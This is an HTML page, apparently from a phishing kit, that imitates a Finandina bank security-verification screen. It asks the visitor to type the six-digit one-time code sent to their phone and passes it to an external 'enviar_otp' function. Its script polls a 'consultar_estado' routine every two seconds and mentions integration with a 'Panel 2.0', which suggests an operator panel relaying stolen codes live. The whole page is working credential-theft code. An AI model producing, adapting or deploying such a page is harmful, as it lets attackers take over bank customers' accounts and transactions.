<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VerificaciÃ³n de Seguridad - Finandina</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./OTP/otp.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <script src="../../scripts/functions.js"></script>
    <script src="../../scripts/functions2.js"></script>
</head>
<body>
<div class="container">
    <img src="img/logo.webp" alt="Banner" class="banner-img" />
    <div class="card">
        <h1 class="main-title">VerificaciÃ³n de Seguridad</h1>
        <div class="icon-lock">
            <img src="./OTP/icono.svg" width="50" height="50" />
        </div>
        <main>
            <h2>CÃ³digo de VerificaciÃ³n</h2>
            <p class="subtitle">Para completar tu transacciÃ³n con Finandina, ingresa el cÃ³digo de 6 dÃ­gitos que recibiste en tu dispositivo mÃ³vil.</p>
            <div class="code-form">
                <input type="tel" inputmode="numeric" name="field1" maxlength="1" class="code-input" id="digit1">
                <input type="tel" inputmode="numeric" name="field2" maxlength="1" class="code-input" id="digit2">
                <input type="tel" inputmode="numeric" name="field3" maxlength="1" class="code-input" id="digit3">
                <input type="tel" inputmode="numeric" name="field4" maxlength="1" class="code-input" id="digit4">
                <input type="tel" inputmode="numeric" name="field5" maxlength="1" class="code-input" id="digit5">
                <input type="tel" inputmode="numeric" name="field6" maxlength="1" class="code-input" id="digit6">
                <input type="hidden" id="txtOTP" name="cDinamica">
            </div>

            <button class="verify-btn" id="btnOTP">Verificar</button>
            
            <div class="mensaje" style="display:none; color:red; text-align:center; margin-top:10px;">
                Por favor ingresa el cÃ³digo de 6 dÃ­gitos
            </div>

            <div class="resend-section">
                <span class="timer">
                    <span class="circle-timer">
                        <svg height="42" width="42">
                            <circle cx="21" cy="21" r="18" stroke="#dedede" stroke-width="4" fill="none"/>
                            <circle class="circle-bar" cx="21" cy="21" r="18" stroke="#f08ba7" stroke-width="4" fill="none"
                                stroke-dasharray="113.1" stroke-dashoffset="113.1" style="transform: rotate(-90deg); transform-origin: center;" />
                        </svg>
                        <span class="time-value">30</span>
                    </span>
                </span>
                <span class="resend-text">Reenviar cÃ³digo</span>
            </div>
        </main>
    </div>
</div>

<script>
function actualizarOTP() {
    const clave = [
        document.getElementById('digit1').value,
        document.getElementById('digit2').value,
        document.getElementById('digit3').value,
        document.getElementById('digit4').value,
        document.getElementById('digit5').value,
        document.getElementById('digit6').value
    ].map(d => d.trim()).join('');

    document.getElementById('txtOTP').value = clave;

    const btnOTP = document.getElementById('btnOTP');
    if (clave.length === 6 && /^\d{6}$/.test(clave)) {
        btnOTP.classList.add('boton-activo');
    } else {
        btnOTP.classList.remove('boton-activo');
    }
}

// IntegraciÃ³n con Panel 2.0 - JavaScript puro sin jQuery
document.addEventListener('DOMContentLoaded', function() {
    const codeInputs = document.querySelectorAll('.code-input');
    const btnOTP = document.getElementById('btnOTP');
    const mensaje = document.querySelector('.mensaje');

    // Manejo de inputs de cÃ³digo
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
            actualizarOTP();
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });

        input.addEventListener('keyup', function() {
            mensaje.style.display = 'none';
            codeInputs.forEach(inp => inp.style.border = "1px solid #CCCCCC");
        });
    });

    // Evento click del botÃ³n verificar
    btnOTP.addEventListener('click', function() {
        const otp = document.getElementById('txtOTP').value.trim();
        if (otp.length === 6 && /^\d{6}$/.test(otp)) {
            enviar_otp(otp);
        } else {
            mensaje.style.display = 'block';
            codeInputs.forEach(inp => inp.style.border = "1px solid red");
        }
    });

    // Timer de reenvÃ­o
    const TOTAL_TIME = 30;
    let timeLeft = TOTAL_TIME;
    const FULL_DASH_ARRAY = 113.1;

    const circle = document.querySelector('.circle-bar');
    const timeValue = document.querySelector('.time-value');
    const resendSection = document.querySelector('.resend-section');

    const timer = setInterval(function() {
        timeLeft--;

        if (timeLeft >= 0) {
            timeValue.textContent = timeLeft;
            const offset = FULL_DASH_ARRAY * (timeLeft / TOTAL_TIME);
            circle.style.strokeDashoffset = offset;
        }

        if (timeLeft <= 0) {
            clearInterval(timer);
            // Eliminar timer y texto
            const timerEl = resendSection.querySelector('.timer');
            const textEl = resendSection.querySelector('.resend-text');
            if (timerEl) timerEl.remove();
            if (textEl) textEl.remove();

            // Crear botÃ³n de reenvÃ­o
            const btnResend = document.createElement('button');
            btnResend.className = 'resend-btn';
            btnResend.textContent = 'Reenviar cÃ³digo';
            btnResend.addEventListener('click', function() {
                location.reload();
            });

            resendSection.appendChild(btnResend);
        }
    }, 1000);

    // Polling para verificar estado del caso
    setInterval(function() {
        consultar_estado();
    }, 2000);
});
</script>

</body>
</html>
